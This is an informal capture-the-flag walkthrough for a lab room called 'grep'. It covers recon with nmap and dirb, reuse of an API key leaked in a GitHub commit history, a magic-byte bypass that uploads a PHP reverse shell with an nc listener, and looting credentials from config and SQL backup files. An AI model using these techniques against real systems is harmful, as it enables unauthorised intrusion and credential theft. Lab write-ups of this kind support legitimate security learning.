@@ -1,0 +1,114 @@
+This is not really a writeup but more of a "my thinking process"
+This room is not about grep.
+
+TARGET_IP = 10.114.152.123
+
+first some basic nmap
+nmap -sS 10.114.152.123 -v
+nmap -sV -p 80,443 10.114.152.123 -v
+
+we found http on 80 and https on ports 443 and 51337
+on the http there was an apache2 default page and the https couldn't be accessed
+for some reason I also tried to enum the http (a bit pointless, yes)
+
+gobuster dir -u "http://10.114.152.123/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+as expected, nothing
+
+This looks like a classic problem where:
+    we don't have the host in /etc/hosts,
+    so we can't access the https site(s)
+
+We will need to try nmap -sC (script scan) for more info (ideally hostname)
+nmap -sC -p 80,443 10.114.152.123 -v
+
+we are saved
+# ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME
+let's add this to /etc/hosts
+nano /etc/hosts
+add this line
+10.114.152.123 grep.thm
+
+now we can access grep.thm, which opens this page:
+https://grep.thm/public/html/
+
+we immediatly see a login form (login.php) and a register form (register.php)
+we could try OWASP 2025 07: Authentication Failures (eg. register as aDmiN and login as admin)
+there is an expired API key so register doesnt work now
+enough web browsing, lets go dirb for hidden directories
+
+dirb https://grep.thm/public/html/
+that was underwhelming, let's try gobuster
+
+gobuster dir -u "https://grep.thm/public/html/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster can't connect due to the expired certificate
+
+I will take a guess that there is more interesting .php stuff
+dirb https://grep.thm/public/html/ -X .php
+yep. found (but they are forbidden) admin.php, upload.php, dashboard.php, logout.php
+
+Let's try doing something about the API key
+I went to the register.php page and inspected the network request
+here I saw the API key value (e8d25b4208b80008a9e15c8698640e85)
+it's not usable now but will be useful if we find some leaked API key so we don't use this one.
+
+The room tests "reconnaissance and OSINT skills"
+we didn't do the latter. let us "google dork"
+what we know from the nmap -sC cert:
+# commonName=grep.thm/organizationName=SearchME
+googling searchme github was sufficient
+we found https://github.com/supersecuredeveloper/searchmecms
+there is a lot of source code, which we might use for some injection later
+
+in the api folder, there is register.php
+it has a commit called "fix: remove key"
+if we click on history of register.php, 
+    we can see the initial version with an API key
+    value: ffe60ecaa8bba2f12b43d1a4b15b8f39
+
+Now we will use BurpSuite to change the API key in the request
+For some reason firefox with foxyproxy proxying https doesnt work with burp. so I used burp browser
+I captured it and replaced the api key:
+
+POST /api/register.php HTTP/1.1
+Host: grep.thm
+...
+X-Thm-Api-Key: ffe60ecaa8bba2f12b43d1a4b15b8f39
+...
+{"username":"adw","password":"adw","email":"daw","name":"dwa"}
+
+#Welcome, adw!
+# First Flag
+ # FIRST_FLAG_VALUE
+
+bruteforcing admin login would probably be possible but more info is needed to make it feasible
+there is upload.php so let's try a php revshell
+unfortunately, the server says it allows only JPG/JPEG, PNG and BMP
+
+upon futrher inspection of their uploads.php on github
+they have a check for file extensions, that just checks for a few hex bytes
+
+we can try to change a part of our revshell (some comments at the start)
+to these hex bytes and see what happenz
+
+for some reason hexedit wouldn't work for me, so I used
+xxd revshell.php  > hex_dump.txt
+nano hex_dump.txt
+now change the first bytes of the first line to 0xFF 0xD8 0xFF 0xE0 for the JPG check
+xxd -r hex_dump.txt > revshell.php
+
+upload worked. nice
+nc -lvnp 4444
+I intuitivelly went to uploads/ and it worked
+https://grep.thm/api/uploads/revshell.php
+
+back to terminal
+we can first check /var/www/hmtl (a recommended location for web)
+i found config.txt which references some mysqli credentials
+lets go back to var/www where we can see a backup folder
+in backup was users.sql, where we found admins email and password hash ()
+
+in /var/www there is leakchecker for checking for leaked passwords to emails
+we had to add it to /etc/hosts next to grep.thm as leakchecker.grep.thm
+as you might remember, there was another https port open on 51337, so lets try
+https://leakchecker.grep.thm:51337/
+as expected, we got admins password
